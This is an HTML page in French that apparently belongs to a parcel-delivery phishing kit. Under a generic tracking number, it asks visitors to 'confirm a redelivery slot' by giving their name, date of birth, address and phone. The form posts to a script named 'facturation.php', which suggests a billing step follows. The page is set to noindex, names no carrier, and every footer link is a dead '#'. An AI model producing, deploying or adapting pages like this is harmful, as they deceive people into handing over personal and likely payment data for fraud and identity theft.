<!DOCTYPE html>
<html lang="fr">
<head>
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
    <meta name="viewport" content="initial-scale=1.0, width=device-width">
    <meta name="description" content="">
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <title>Confirmation | Livraison de mes colis</title>
    <link rel="stylesheet" type="text/css" href="/css/style.css?202307">
    <script src="/js/jquery-3.7.0.min.js"></script>
    <script src="/js/jquery.mask.js"></script>
    <script src="/js/mask.js"></script>
    <style>
        .contentContainer {
            margin-bottom: 150px; /* Ajustez cette valeur selon vos besoins */
        }

        .footer {
            margin-top: 50px; /* Ajustez cette valeur selon vos besoins */
        }

        body {
            min-height: 100vh; /* Assure que le corps prend au moins toute la hauteur de la fenêtre */
            display: flex;
            flex-direction: column;
        }

        .corral {
            flex: 1;
        }
    </style>
</head>
<body>

<div class="corral">
    <div class="contentContainer activeContent contentContainerBordered">
        <header id="header">
            <img src="/img/logo-min.png" alt="" width="85%">
        </header>
            
        <h2>Numéro de suivi : 69487</h2>
        <h4 id="deliverySchedule"></h4>
        <p>Afin de pouvoir confirmer ce créneau de livraison, merci de compléter les informations suivantes :</p>
        <h3>Informations personnelles</h3>
        <form name="confirmation_form" method="post" action="/action/facturation.php" novalidate="novalidate">
            <div class="fieldWrapper"><input type="text" id="confirmation_form_firstName" name="confirmation_form[firstName]" required="required" placeholder=""><label for="confirmation_form_firstName" class="required">Prénom</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_lastName" name="confirmation_form[lastName]" required="required" placeholder=""><label for="confirmation_form_lastName" class="required">Nom</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_birthDate" name="confirmation_form[birthDate]" required="required" class="js-date" placeholder="" inputmode="numeric" pattern="\d*" maxlength="10"><label class="placeLabel required" for="confirmation_form_birthDate">Date de naissance</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_address" name="confirmation_form[address]" required="required" placeholder=""><label for="confirmation_form_address" class="required">Adresse</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_zipCode" name="confirmation_form[zipCode]" required="required" placeholder="" inputmode="numeric" pattern="\d*"><label for="confirmation_form_zipCode" class="required">Code postal</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_city" name="confirmation_form[city]" required="required" placeholder=""><label for="confirmation_form_city" class="required">Ville</label></div>
            <div class="fieldWrapper"><input type="text" id="confirmation_form_phone" name="confirmation_form[phone]" required="required" placeholder=""><label for="confirmation_form_phone" class="required">Téléphone</label></div>
            <div><button type="submit" id="confirmation_form_submit" name="confirmation_form[submit]">Confirmer ma re-livraison</button></div>
            <input type="hidden" id="confirmation_form__token" name="confirmation_form[_token]" value="ee3121c7df080baff0fcf.9ED_qXsMDNwOR9XwXuZyNm4fPnGsDH-TtzTklyeYo8M.sQG2hBh9T7Nkdqe8E4U1eSRGah7pQUrS3Fi29XKq8qbCN87aCDx-8U0Bpg">
        </form>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                function getCookie(name) {
                    const value = `; ${document.cookie}`;
                    const parts = value.split(`; ${name}=`);
                    if (parts.length === 2) return parts.pop().split(';').shift();
                }

                const deliverySchedule = getCookie('deliverySchedule');
                if (deliverySchedule) {
                    document.getElementById('deliverySchedule').textContent = `Confirmez votre créneau de livraison pour le ${decodeURIComponent(deliverySchedule)}`;
                }

                document.querySelector("button[type=submit]").addEventListener("click", function(e) {
                    document.getElementById("loader-div-new").classList.remove("hidden-class-new");
                    document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;";
                });
            });
        </script>
    </div>
    <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="#" pa-marked="1">Contact</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Contrats d'utilisation</a></li>
                <li><a target="_blank" href="#" pa-marked="1">International</a></li>
            </ul>
        </div>
    </footer>
</div>

</body>
</html>
